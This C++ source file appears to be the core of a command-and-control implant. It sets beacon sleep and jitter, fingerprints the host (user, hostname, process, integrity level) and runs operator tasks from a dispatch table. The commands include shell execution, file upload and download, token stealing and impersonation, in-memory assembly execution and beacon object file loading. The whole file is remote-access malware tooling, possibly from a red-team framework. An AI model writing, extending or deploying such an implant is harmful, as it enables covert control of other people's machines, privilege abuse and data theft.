#include "Agent.h"
#include "AgentConfig.h"
#include "Commands.h"
#include <thread>
#include <chrono>
#include <random>
#include <unordered_map>

Agent::Agent()
	: BeaconIntervalMs(GetBeaconSleepMs()), BeaconJitterMs(GetBeaconJitterMs())
{
	Commands = loadCommands();
	Metadata = generateMetadata();
}

std::unordered_map<std::string, std::function<std::string(const Task&)>> Agent::loadCommands() {
	std::unordered_map<std::string, std::function<std::string(const Task&)>> commands;

	commands["whoami"]      = [](const Task& t) { return whoami(t.arguments); };
	commands["shell"]       = [](const Task& t) { return shell(t.arguments); };
	commands["run"]         = [](const Task& t) { return run(t.arguments); };
	commands["pwd"]         = [](const Task& t) { return pwd(t.arguments); };
	commands["cd"]          = [](const Task& t) { return Cd(t.arguments); };
	commands["ls"]          = [](const Task& t) { return Ls(t.arguments); };
	commands["download"]    = [](const Task& t) { return Download(t.arguments); };
	commands["make_token"]  = [](const Task& t) { return MakeToken(t.arguments); };
	commands["steal_token"] = [](const Task& t) { return StealToken(t.arguments); };
	commands["rev2self"]    = [](const Task& t) { return Rev2Self(t.arguments); };
	commands["upload"]      = [](const Task& t) { return Upload(t.arguments, t.file); };
	commands["inline-assembly"] = [](const Task& t) { return InlineAssembly(t.arguments, t.file); };
	commands["bof"]         = [](const Task& t) { return RunBOF(t.arguments, t.file, t.file2); };
	commands["set_sleep"]   = [this](const Task& t) -> std::string {
		if (t.arguments.size() < 2)
			return "Error: usage: set_sleep <interval_ms> <jitter_ms>";
		try {
			DWORD interval = static_cast<DWORD>(std::stoul(t.arguments[0]));
			DWORD jitter   = static_cast<DWORD>(std::stoul(t.arguments[1]));
			setBeaconIntervalMs(interval);
			setBeaconJitterMs(jitter);
			return "Sleep set to " + std::to_string(interval) + " ms +/- " + std::to_string(jitter) + " ms";
		} catch (...) {
			return "Error: interval and jitter must be positive integers";
		}
	};

	return commands;
}

AgentMetadata Agent::generateMetadata() {
	std::mt19937 rng(
		static_cast<unsigned int>(
			std::chrono::steady_clock::now().time_since_epoch().count()
		) ^ GetCurrentProcessId()
	);
	std::uniform_int_distribution<int> dist(1000, 9999);

	Task emptyTask{};
	AgentMetadata metadata = {
		dist(rng),
		GetHostname(),
		Commands["whoami"](emptyTask),
		GetProcessname(),
		static_cast<int>(GetCurrentProcessId()),
		GetProcessIntegrityLevel(),
		GetArch()
	};
	return metadata;
}

AgentMetadata Agent::getMetadata(){
	return Metadata;
}

void Agent::addTask(const Task& task) {
	{
		std::lock_guard<std::mutex> lock(m_mutex);
		Tasks.push(task);
	}
	m_taskCv.notify_one();
}

Task Agent::getNextTask() {
	std::lock_guard<std::mutex> lock(m_mutex);
	Task task = Tasks.front();
	Tasks.pop();
	return task;
}

void Agent::addResult(const TaskResult& result) {
	std::lock_guard<std::mutex> lock(m_mutex);
	Results.push(result);
}

TaskResult Agent::getNextResult() {
	std::lock_guard<std::mutex> lock(m_mutex);
	TaskResult result = Results.front();
	Results.pop();
	return result;
}

std::vector<TaskResult> Agent::getTaskResults() {
	std::lock_guard<std::mutex> lock(m_mutex);
	std::vector<TaskResult> results_toret;
	while (!Results.empty()) {
		results_toret.push_back(Results.front());
		Results.pop();
	}
	return results_toret;
}

void Agent::executeTask(Task& task) {
	std::string command_output;
	auto it = Commands.find(task.command);
	if (it != Commands.end()) {
		command_output = it->second(task);
	} else {
		command_output = "Command not found";
	}

	TaskResult result = { task.id, command_output };
	addResult(result);
}

void Agent::Work() {
	while (true) {
		std::unique_lock<std::mutex> lock(m_mutex);
		// Wait up to 100 ms for a task to arrive instead of busy-sleeping for 1 s.
		m_taskCv.wait_for(lock, std::chrono::milliseconds(100), [this]{ return !Tasks.empty(); });
		if (!Tasks.empty()) {
			Task task = Tasks.front();
			Tasks.pop();
			lock.unlock();
			executeTask(task);
		}
	}
}
